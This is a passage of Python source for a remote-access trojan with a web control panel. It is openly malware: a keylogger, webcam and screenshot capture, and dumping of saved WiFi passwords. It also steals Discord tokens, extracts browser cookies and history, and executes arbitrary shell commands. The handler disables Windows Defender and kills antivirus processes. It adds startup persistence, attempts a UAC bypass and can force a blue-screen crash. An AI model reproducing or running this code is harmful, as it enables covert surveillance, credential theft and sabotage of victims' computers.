            text-align: center;
            flex: 1;
            margin: 5px;
            min-width: 120px;
        }
        .status-value {
            font-weight: bold;
            color: #4CAF50;
            font-size: 1.1em;
        }
        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .control-card {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        .control-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            border-color: rgba(76, 175, 80, 0.3);
        }
        .control-card h3 {
            color: #4CAF50;
            margin-top: 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 10px;
        }
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            border: none;
            padding: 12px 20px;
            margin: 5px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s ease;
            width: calc(100% - 10px);
        }
        .btn:hover {
            background: linear-gradient(135deg, #45a049 0%, #4CAF50 100%);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
        }
        .btn-danger {
            background: linear-gradient(135deg, #f44336 0%, #d32f2f 100%);
        }
        .btn-danger:hover {
            background: linear-gradient(135deg, #d32f2f 0%, #f44336 100%);
            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.4);
        }
        .btn-warning {
            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
        }
        .btn-warning:hover {
            background: linear-gradient(135deg, #f57c00 0%, #ff9800 100%);
            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.4);
        }
        .input-group {
            margin: 10px 0;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #ccc;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.3);
            color: white;
            font-size: 14px;
        }
        .result-area {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        .result-area pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #4CAF50;
            margin: 0;
        }
        .stream-container {
            margin: 20px 0;
            border: 2px solid #333;
            border-radius: 8px;
            overflow: hidden;
            background: black;
        }
        .stream-video {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        .tab-container {
            margin-bottom: 20px;
        }
        .tabs {
            display: flex;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px 10px 0 0;
            overflow: hidden;
        }
        .tab {
            flex: 1;
            padding: 15px;
            text-align: center;
            background: rgba(255, 255, 255, 0.05);
            cursor: pointer;
            transition: all 0.3s ease;
            border-bottom: 3px solid transparent;
        }
        .tab.active {
            background: rgba(76, 175, 80, 0.2);
            border-bottom: 3px solid #4CAF50;
        }
        .tab-content {
            display: none;
            padding: 20px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 0 0 10px 10px;
        }
        .tab-content.active {
            display: block;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            background: #4CAF50;
            color: white;
            border-radius: 5px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }
        .notification.show {
            transform: translateX(0);
        }
        .download-btn {
            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
        }
        .download-btn:hover {
            background: linear-gradient(135deg, #1976D2 0%, #2196F3 100%);
            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.4);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖥️ System Control Panel</h1>
            <p>Complete remote system management interface</p>
        </div>

        <div class="status-bar">
            <div class="status-item">
                <div>Hostname</div>
                <div class="status-value" id="hostname">Loading...</div>
            </div>
            <div class="status-item">
                <div>IP Address</div>
                <div class="status-value" id="ip">Loading...</div>
            </div>
            <div class="status-item">
                <div>User</div>
                <div class="status-value" id="user">Loading...</div>
            </div>
            <div class="status-item">
                <div>Stream Status</div>
                <div class="status-value" id="stream-status">INACTIVE</div>
            </div>
            <div class="status-item">
                <div>Keylogger</div>
                <div class="status-value" id="keylogger-status">INACTIVE</div>
            </div>
        </div>

        <div class="tab-container">
            <div class="tabs">
                <div class="tab active" onclick="switchTab('system')">System Controls</div>
                <div class="tab" onclick="switchTab('info')">Information</div>
                <div class="tab" onclick="switchTab('browser')">Browser Data</div>
                <div class="tab" onclick="switchTab('files')">File Manager</div>
            </div>

            <div id="system-tab" class="tab-content active">
                <div class="control-grid">
                    <div class="control-card">
                        <h3>🔧 System Commands</h3>
                        <button class="btn" onclick="captureScreen()">📸 Capture Screenshot</button>
                        <button class="btn" onclick="executeCommand('webcam')">📷 Webcam Photo</button>
                        <button class="btn" onclick="getClipboard()">📋 Get Clipboard</button>
                        <button class="btn" onclick="showMessage()">💬 Show Message Box</button>
                        <div class="input-group">
                            <input type="text" id="message-text" placeholder="Message text...">
                        </div>
                        <div class="input-group">
                            <input type="text" id="video-path" placeholder="Path to .mp4 video...">
                            <button class="btn" onclick="playVideo()">🎬 Play Video Fullscreen</button>
                        </div>
                        <div class="input-group">
                            <label for="volume-range">🔊 System Volume:</label>
                            <input type="range" id="volume-range" min="0" max="100" value="50" style="width:70%;">
                            <span id="volume-value">50</span>%
                            <button class="btn" onclick="setVolume()">Set Volume</button>
                            <button class="btn" onclick="getVolume()">Get Volume</button>
                            <button class="btn" onclick="muteVolume()">Mute</button>
                            <button class="btn" onclick="unmuteVolume()">Unmute</button>
                        </div>
                    </div>

                    <div class="control-card">
                        <h3>⚡ Power Controls</h3>
                        <button class="btn btn-warning" onclick="executeCommand('restart')">🔄 Restart PC</button>
                        <button class="btn btn-danger" onclick="executeCommand('shutdown')">⏻ Shutdown PC</button>
                        <button class="btn btn-danger" onclick="executeCommand('bsod')">💀 Trigger BSOD</button>
                        <button class="btn" onclick="executeCommand('cancelrestart')">❌ Cancel Restart</button>
                    </div>

                    <div class="control-card">
                        <h3>🌐 Network & Web</h3>
                        <button class="btn" onclick="executeCommand('ip')">🌍 Get IP</button>
                        <button class="btn" onclick="executeCommand('wifi')">📶 WiFi Info</button>
                        <button class="btn" onclick="executeCommand('wifi_passwords')">🔑 WiFi Passwords</button>
                        <div class="input-group">
                            <input type="text" id="url-input" placeholder="https://example.com">
                            <button class="btn" onclick="openUrl()">🌐 Open URL</button>
                        </div>
                    </div>

                    <div class="control-card">
                        <h3>⌨️ Keylogger</h3>
                        <button class="btn" onclick="startKeylog()">🎯 Start Keylogging</button>
                        <button class="btn" onclick="stopKeylog()">⛔ Stop Keylogging</button>
                        <button class="btn" onclick="getKeylog()">📊 Get Keylog</button>
                    </div>

                    <div class="control-card">
                        <h3>🛡️ Security</h3>
                        <button class="btn" onclick="executeCommand('avbypass')">🛡️ AV Bypass</button>
                        <button class="btn" onclick="executeCommand('persist')">🔗 Add Persistence</button>
                        <button class="btn" onclick="executeCommand('su')">⬆️ Request Admin</button>
                        <button class="btn" onclick="executeCommand('discord')">📱 Discord Tokens</button>
                    </div>

                    <div class="control-card">
                        <h3>🔍 Program Launcher</h3>
                        <div class="input-group">
                            <input type="text" id="program-name" placeholder="Program name...">
                            <button class="btn" onclick="openProgram()">🚀 Open Program</button>
                        </div>
                    </div>

                    <div class="control-card">
                        <h3>💻 Shell Command</h3>
                        <div class="input-group">
                            <input type="text" id="shell-command" placeholder="Enter shell command...">
                            <button class="btn" onclick="runShellCommand()">▶️ Execute</button>
                        </div>
                    </div>
                </div>
            </div>

            <div id="info-tab" class="tab-content">
                <div class="control-grid">
                    <div class="control-card">
                        <h3>🖥️ System Information</h3>
                        <button class="btn" onclick="executeCommand('systeminfo')">💻 System Info</button>
                        <button class="btn" onclick="executeCommand('cpu')">🚀 CPU Info</button>
                        <button class="btn" onclick="executeCommand('gpu')">🎮 GPU Info</button>
                        <button class="btn" onclick="executeCommand('ram')">🧠 RAM Info</button>
                        <button class="btn" onclick="executeCommand('osinfo')">⚙️ OS Info</button>
                        <button class="btn" onclick="executeCommand('drives')">💾 Drives Info</button>
                    </div>

                    <div class="control-card">
                        <h3>🔗 Network Information</h3>
                        <button class="btn" onclick="executeCommand('mac')">📡 MAC Address</button>
                        <button class="btn" onclick="executeCommand('uuid')">🆔 UUID</button>
                        <button class="btn" onclick="executeCommand('dns')">🌐 DNS Info</button>
                        <button class="btn" onclick="executeCommand('hostname')">🏠 Hostname</button>
                    </div>

                    <div class="control-card">
                        <h3>📊 Browser History</h3>
                        <button class="btn" onclick="getBrowserHistory('chrome')">🔄 Chrome History</button>
                        <button class="btn" onclick="getBrowserHistory('edge')">🌐 Edge History</button>
                        <button class="btn" onclick="getBrowserHistory('firefox')">🦊 Firefox History</button>
                        <button class="btn" onclick="getBrowserHistory('brave')">🦁 Brave History</button>
                        <button class="btn download-btn" onclick="downloadFullHistory()">📥 Download Full History</button>
                    </div>
                </div>
            </div>

            <div id="browser-tab" class="tab-content">
                <div class="control-card">
                    <h3>🍪 Browser Data Extraction</h3>
                    <button class="btn" onclick="extractCookies()">🔓 Extract All Cookies</button>
                    <button class="btn download-btn" onclick="downloadFullCookies()">📥 Download Full Cookies</button>
                    <button class="btn" onclick="executeCommand('discord')">📱 Discord Tokens</button>
                    <div class="result-area">
                        <pre id="browser-result">Browser data will appear here...</pre>
                    </div>
                </div>
            </div>

            <div id="files-tab" class="tab-content">
                <div class="control-card">
                    <h3>📁 File Manager</h3>
                    <div class="input-group">
                        <input type="text" id="file-path" placeholder="Current directory..." readonly>
                    </div>
                    <button class="btn" onclick="listFiles()">📋 List Files</button>
                    <button class="btn" onclick="goUp()">📁 Go Up</button>
                    <div class="input-group">
                        <input type="text" id="new-path" placeholder="Enter directory path...">
                        <button class="btn" onclick="changeDirectory()">📂 Change Directory</button>
                    </div>
                    <div class="input-group">
                        <input type="text" id="file-to-download" placeholder="File to download...">
                        <button class="btn" onclick="downloadFile()">📥 Download File</button>
                    </div>
                    <div class="input-group">
                        <input type="text" id="file-to-delete" placeholder="File to delete...">
                        <button class="btn btn-danger" onclick="deleteFile()">🗑️ Delete File</button>
                    </div>
                    <div class="input-group">
                        <input type="file" id="file-to-upload" placeholder="File to upload...">
                        <button class="btn" onclick="uploadFile()">📤 Upload File</button>
                    </div>
                    <div class="result-area">
                        <pre id="file-result">File listing will appear here...</pre>
                    </div>
                </div>
            </div>
        </div>

        <div class="control-card">
            <h3>📊 Command Results</h3>
            <div class="result-area">
                <pre id="command-result">Command results will appear here...</pre>
            </div>
        </div>
    </div>

    <div id="notification" class="notification"></div>

<script>
    let currentTab = 'system';
    
    function switchTab(tabName) {
        document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
        
        document.querySelector(`.tab:nth-child(${getTabIndex(tabName)})`).classList.add('active');
        document.getElementById(`${tabName}-tab`).classList.add('active');
        currentTab = tabName;
    }
    
    function getTabIndex(tabName) {
        const tabs = ['system', 'info', 'browser', 'files'];
        return tabs.indexOf(tabName) + 1;
    }
    
    function showNotification(message, type = 'success') {
        const notification = document.getElementById('notification');
        notification.textContent = message;
        notification.className = `notification show ${type}`;
        setTimeout(() => {
            notification.classList.remove('show');
        }, 3000);
    }
    
    async function executeCommand(command, params = '') {
        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ command, parameters: params })
            });
            const result = await response.json();
            // Special handling for webcam image
            if (command === 'webcam' && result.success && result.image_url) {
                const imgResponse = await fetch(result.image_url);
                if (imgResponse.ok) {
                    const blob = await imgResponse.blob();
                    const url = URL.createObjectURL(blob);
                    const img = document.createElement('img');
                    img.src = url;
                    img.style.maxWidth = '100%';
                    document.getElementById('command-result').innerHTML = '';
                    document.getElementById('command-result').appendChild(img);
                    showNotification('Webcam image captured!');
                } else {
                    document.getElementById('command-result').textContent = 'Error loading webcam image';
                }
                updateStatus();
                return;
            }
            document.getElementById('command-result').textContent = result.result || result.error;
            if (result.success) {
                showNotification(`Command ${command} executed successfully!`);
            } else {
                showNotification(`Error: ${result.error}`, 'error');
            }
            updateStatus();
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }
    async function uploadFile() {
        const fileInput = document.getElementById('file-to-upload');
        const file = fileInput.files[0];
        if (!file) {
            alert("Please select a file to upload.");
            return;
        }

        const formData = new FormData();
        formData.append('file', file);

        try {
            const response = await fetch('/api/upload_file', {
                method: 'POST',
                body: formData
            });

            const text = await response.text();
            document.getElementById('file-result').textContent = text;
        } catch (error) {
            document.getElementById('file-result').textContent = "Error: " + error;
        }
    }
    async function captureScreen() {
        try {
            const response = await fetch('/api/screen');
            if (response.ok) {
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const img = document.createElement('img');
                img.src = url;
                img.style.maxWidth = '100%';
                
                document.getElementById('command-result').innerHTML = '';
                document.getElementById('command-result').appendChild(img);
                showNotification('Screenshot captured!');
            } else {
                const result = await response.json();
                document.getElementById('command-result').textContent = result.error;
            }
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
        }
    }

    async function showMessage() {
        const message = document.getElementById('message-text').value;
        if (message) {
            try {
                const response = await fetch('/api/msg', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ message: message })
                });
                
                const result = await response.json();
                document.getElementById('command-result').textContent = result.result || result.error;
            } catch (error) {
                document.getElementById('command-result').textContent = `Error: ${error}`;
            }
        }
    }

    async function getClipboard() {
        try {
            const response = await fetch('/api/clipboard');
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result || result.error;
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
        }
    }

    async function startKeylog() {
        try {
            const response = await fetch('/api/log_start');
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result;
            document.getElementById('keylogger-status').textContent = 'ACTIVE';
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
        }
    }

    async function stopKeylog() {
        try {
            const response = await fetch('/api/log_stop');
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result;
            document.getElementById('keylogger-status').textContent = 'INACTIVE';
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
        }
    }

    async function getKeylog() {
        try {
            const response = await fetch('/api/get_keylog');
            const result = await response.json();
            document.getElementById('command-result').textContent = result.log || 'No keylog data available';
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
        }
    }

    function openUrl() {
        const url = document.getElementById('url-input').value;
        if (url) {
            executeCommand('url', url);
        }
    }
    
    function openProgram() {
        const program = document.getElementById('program-name').value;
        if (program) {
            executeCommand('open', program);
        }
    }
    
    function runShellCommand() {
        const command = document.getElementById('shell-command').value;
        if (command) {
            executeCommand('exec', command);
        }
    }
    
    async function getBrowserHistory(browser) {
        executeCommand('recent', browser);
    }
    
    async function extractCookies() {
        try {
            document.getElementById('browser-result').textContent = 'Extracting cookies... This may take a few minutes.';
            const response = await fetch('/api/extract_cookies');
            const result = await response.json();
            
            if (result.success) {
                document.getElementById('browser-result').textContent = result.result;
                showNotification('Cookies extracted successfully!');
            } else {
                document.getElementById('browser-result').textContent = result.error;
                showNotification('Error extracting cookies', 'error');
            }
        } catch (error) {
            document.getElementById('browser-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }

    async function downloadFullCookies() {
        try {
            const response = await fetch('/api/download_cookies');
            if (response.ok) {
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'browser_cookies_complete.json';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                showNotification('Full cookies downloaded!');
            } else {
                showNotification('Error downloading cookies', 'error');
            }
        } catch (error) {
            showNotification('Network error occurred', 'error');
        }
    }

    async function downloadFullHistory() {
        try {
            const response = await fetch('/api/download_history');
            if (response.ok) {
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'browser_history_complete.json';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                showNotification('Full history downloaded!');
            } else {
                showNotification('Error downloading history', 'error');
            }
        } catch (error) {
            showNotification('Network error occurred', 'error');
        }
    }
    
    async function listFiles() {
        try {
            const response = await fetch('/api/list_files');
            const text = await response.text();
            let result;
            try {
                result = JSON.parse(text);
            } catch {
                document.getElementById('file-result').textContent = "Non-JSON response:\n" + text;
                return;
            }
            document.getElementById('file-result').textContent = result.files || result.error;
            document.getElementById('file-path').value = result.current_dir || '';
        } catch (error) {
            document.getElementById('file-result').textContent = `Error: ${error}`;
        }
    }
    
    async function changeDirectory() {
        const path = document.getElementById('new-path').value;
        if (path) {
            try {
                const response = await fetch('/api/change_dir', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ path })
                });
                
                const result = await response.json();
                document.getElementById('file-result').textContent = result.message || result.error;
                document.getElementById('file-path').value = result.current_dir || '';
                document.getElementById('new-path').value = '';
            } catch (error) {
                document.getElementById('file-result').textContent = `Error: ${error}`;
            }
        }
    }
    
    async function goUp() {
        try {
            const response = await fetch('/api/go_up');
            const result = await response.json();
            document.getElementById('file-result').textContent = result.message || result.error;
            document.getElementById('file-path').value = result.current_dir || '';
        } catch (error) {
            document.getElementById('file-result').textContent = `Error: ${error}`;
        }
    }
    
    async function downloadFile() {
        const file = document.getElementById('file-to-download').value;
        if (file) {
            window.open(`/api/download_file?file=${encodeURIComponent(file)}`, '_blank');
            document.getElementById('file-to-download').value = '';
        }
    }
    
    async function deleteFile() {
        const file = document.getElementById('file-to-delete').value;
        if (file) {
            try {
                const response = await fetch('/api/delete_file', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ file })
                });
                
                const result = await response.json();
                document.getElementById('file-result').textContent = result.message || result.error;
                document.getElementById('file-to-delete').value = '';
                listFiles();
            } catch (error) {
                document.getElementById('file-result').textContent = `Error: ${error}`;
            }
        }
    }
    
    async function updateStatus() {
        try {
            const response = await fetch('/api/status');
            const status = await response.json();
            
            document.getElementById('hostname').textContent = status.hostname;
            document.getElementById('ip').textContent = status.ip;
            document.getElementById('user').textContent = status.user;
            document.getElementById('keylogger-status').textContent = status.keylogger_active ? 'ACTIVE' : 'INACTIVE';
        } catch (error) {
            console.error('Error updating status:', error);
        }
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        updateStatus();
        setInterval(updateStatus, 5000);
    });

    // Volume control JS
    document.getElementById('volume-range').addEventListener('input', function() {
        document.getElementById('volume-value').textContent = this.value;
    });

    async function setVolume() {
        const vol = document.getElementById('volume-range').value;
        try {
            const response = await fetch('/api/set_volume', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ volume: vol })
            });
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result || result.error;
            if (result.success) showNotification('Volume set!');
            else showNotification('Error setting volume', 'error');
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }

    async function getVolume() {
        try {
            const response = await fetch('/api/get_volume');
            const result = await response.json();
            if (result.success) {
                document.getElementById('volume-range').value = result.volume;
                document.getElementById('volume-value').textContent = result.volume;
                document.getElementById('command-result').textContent = `Current volume: ${result.volume}%`;
                showNotification('Volume fetched!');
            } else {
                document.getElementById('command-result').textContent = result.error;
                showNotification('Error getting volume', 'error');
            }
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }

    async function muteVolume() {
        try {
            const response = await fetch('/api/mute_volume', { method: 'POST' });
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result || result.error;
            if (result.success) showNotification('Muted!');
            else showNotification('Error muting', 'error');
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }

    async function unmuteVolume() {
        try {
            const response = await fetch('/api/unmute_volume', { method: 'POST' });
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result || result.error;
            if (result.success) showNotification('Unmuted!');
            else showNotification('Error unmuting', 'error');
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }

    async function playVideo() {
        const path = document.getElementById('video-path').value;
        try {
            const response = await fetch('/api/play_video', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path: path })
            });
            const result = await response.json();
            document.getElementById('command-result').textContent = result.result || result.error;
            if (result.success) showNotification('Video played!');
            else showNotification('Error playing video', 'error');
        } catch (error) {
            document.getElementById('command-result').textContent = `Error: ${error}`;
            showNotification('Network error occurred', 'error');
        }
    }
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_INTERFACE

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.json
    command = data.get('command', '')
    parameters = data.get('parameters', '')
    
    try:
        if command == 'webcam':
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    img_bytes = io.BytesIO()
                    img_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(img_rgb)
                    temp_file = os.path.join(os.getenv('TEMP'), 'webcam.png')
                    img_pil.save(temp_file, "PNG")
                    # Instead of sending the file, return a JSON with the image URL
                    return jsonify({'success': True, 'image_url': '/api/webcam_image'})
                else:
                    return jsonify({'success': False, 'error': 'Failed to capture webcam image'})
            except:
                return jsonify({'success': False, 'error': 'Webcam not available'})
        
        elif command == 'ip':
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            return jsonify({'success': True, 'result': f'IP: {ip_address}'})
        
        elif command == 'wifi':
            result = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'wifi_passwords':
            profiles = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
            profile_names = [
                line.split(":")[1].strip()
                for line in profiles.splitlines()
                if "All User Profile" in line
            ]
            passwords = []
            for name in profile_names:
                try:
                    pw_info = subprocess.check_output(
                        f'netsh wlan show profile name="{name}" key=clear',
                        shell=True,
                        text=True,
                        stderr=subprocess.DEVNULL,
                    )
                    password = None
                    for line in pw_info.splitlines():
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            break
                    if password:
                        passwords.append(f"{name}: {password}")
                    else:
                        passwords.append(f"{name}: <No password>")
                except:
                    passwords.append(f"{name}: <Error>")
            return jsonify({'success': True, 'result': '\n'.join(passwords)})
        
        elif command == 'url':
            if parameters:
                url = "http://" + parameters if not parameters.startswith(("http://", "https://")) else parameters
                webbrowser.open(url)
                return jsonify({'success': True, 'result': f'Opened URL: {url}'})
        elif command == 'log':
            log_active = True
            keyboard.hook(on_key_event)
            return jsonify({'success': True, 'result': 'Keylogging started'})
        
        elif command == 'stoplog':
            log_active = False
            return jsonify({'success': True, 'result': 'Keylogging stopped'})
        
        elif command == 'avbypass':
            defender_disabled = disable_defender()
            exclusion_added = add_exclusion(sys.argv[0])
            av_killed = kill_av_processes()
            process_hidden = hide_process()
            startup_added = add_to_startup()
            result = f"""Antivirus Bypass Results:
Defender Disabled: {'✅' if defender_disabled else '❌'}
Exclusion Added: {'✅' if exclusion_added else '❌'}
AV Processes Killed: {'✅' if av_killed else '❌'}
Process Hidden: {'✅' if process_hidden else '❌'}
Startup Persistence: {'✅' if startup_added else '❌'}"""
            return jsonify({'success': True, 'result': result})
        
        elif command == 'persist':
            success = add_to_startup()
            return jsonify({'success': success, 'result': 'Persistence added' if success else 'Failed to add persistence'})
        
        elif command == 'su':
            try:
                if ctypes.windll.shell32.IsUserAnAdmin():
                    return jsonify({'success': True, 'result': 'Already running as administrator'})
                uacMethod2(["c:\\windows\\system32\\cmd.exe ", "/k", f"python {__file__}"])
                return jsonify({'success': True, 'result': 'Admin privileges requested'})
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to elevate: {e}'})
        
        elif command == 'discord':
            tokens = DiscordTokenStealer.get_tokens()
            if tokens:
                token_list = []
                for i, token_info in enumerate(tokens, 1):
                    token_list.append(f"{i}. {token_info['platform']}: {token_info['token']}")
                return jsonify({'success': True, 'result': '\n'.join(token_list)})
            else:
                return jsonify({'success': False, 'error': 'No Discord tokens found'})
        
        elif command == 'open':
            if parameters:
                shortcuts = search_shortcut(parameters)
                if not shortcuts:
                    return jsonify({'success': False, 'error': f'Program {parameters} not found'})
                selected_shortcut = shortcuts[0]
                target_path = get_shortcut_target(selected_shortcut)
                if target_path and os.path.exists(target_path):
                    program_path = target_path
                else:
                    program_path = str(selected_shortcut)
                try:
                    os.startfile(program_path)
                    return jsonify({'success': True, 'result': f'Program {selected_shortcut.stem} launched'})
                except Exception as e:
                    return jsonify({'success': False, 'error': f'Error opening program: {e}'})
        elif command == 'exec':
            if parameters:
                try:
                    result = subprocess.check_output(parameters, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
                    return jsonify({'success': True, 'result': result})
                except subprocess.CalledProcessError as e:
                    return jsonify({'success': False, 'error': e.output})
                except Exception as e:
                    return jsonify({'success': False, 'error': str(e)})
                
                
                
        
        elif command == 'shutdown':
            os.system("shutdown /s /t 1")
            return jsonify({'success': True, 'result': 'Shutting down...'})
        elif command == 'restart':
            os.system("shutdown /r /t 1")
            return jsonify({'success': True, 'result': 'Restarting...'})
        
        elif command == 'bsod':
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(3221226010, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
                return jsonify({'success': True, 'result': 'Triggering BSOD...'})
            except Exception as e:
                return jsonify({'success': False, 'error': f'Error triggering BSOD: {e}'})
        
        elif command == 'cancelrestart':
            stop_event.set()
            return jsonify({'success': True, 'result': 'Restart cancelled'})
        
        elif command == 'systeminfo':
            result = subprocess.check_output("systeminfo", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'cpu':
            result = subprocess.check_output("wmic cpu get name", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'gpu':
            result = subprocess.check_output("wmic path win32_VideoController get name", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'ram':
            result = subprocess.check_output("wmic memorychip get capacity", shell=True, text=True)
            lines = result.strip().split("\n")[1:]
            total_bytes = sum(int(line.strip()) for line in lines if line.strip())
            total_gb = round(total_bytes / (1024**3), 2)
            result2 = subprocess.check_output("wmic memorychip get speed,partnumber,manufacturer", shell=True, text=True)
            return jsonify({'success': True, 'result': f'Total RAM: {total_gb} GB\n{result2}'})

        elif command == 'osinfo':
            result = subprocess.check_output("ver", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'drives':
            result = subprocess.check_output("wmic logicaldisk get name,size,freespace,description", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'mac':
            result = subprocess.check_output("getmac", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'uuid':
            result = subprocess.check_output("wmic csproduct get uuid", shell=True, text=True)
            return jsonify({'success': True, 'result': result})
        
        elif command == 'dns':
            result = subprocess.check_output("ipconfig /all", shell=True, text=True)
            dns_lines = [line for line in result.splitlines() if "DNS Servers" in line or line.strip().startswith("DNS")]
            dns_lines = ["No DNS info found."] if not dns_lines else dns_lines
            return jsonify({'success': True, 'result': '\n'.join(dns_lines)})
        
        elif command == 'hostname':
            result = socket.gethostname()
            return jsonify({'success': True, 'result': result})
        
        elif command == 'user':
            result = os.getlogin()
            return jsonify({'success': True, 'result': result})
        
        elif command == 'recent':
            browser = parameters.lower() if parameters else "chrome"
            history = []
            if browser in ["chrome", "edge", "brave"]:
                browser_paths = {
                    "chrome": os.path.join(getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                    "edge": os.path.join(getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),

                    "brave": os.path.join(getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
                }
                path = browser_paths.get(browser)
                if path and os.path.exists(path):
                    history_files = []
                    for root, dirs, files in os.walk(path):
                        if ("Extensions" in root):
                            continue
                        if ("History" in files):
                            history_files.append(os.path.join(root, "History"))

                    for history_file in history_files:
                        try:
                            temp_db = os.path.join(getenv("TEMP"), "temp_history.db")
                            shutil.copy2(history_file, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC")
                            
                            for (url, title, visit_time) in cursor.fetchall():
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                                history.append({
                                    'browser': browser,
                                    'url': url,
                                    'title': title if title else '[No Title]',
                                    'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                                    'visit_time': visit_time
                                })
                            conn.close()
                            os.remove(temp_db)
                        except Exception:
                            continue
            elif browser == "firefox":
                firefox_path = os.path.join(getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
                if os.path.exists(firefox_path):
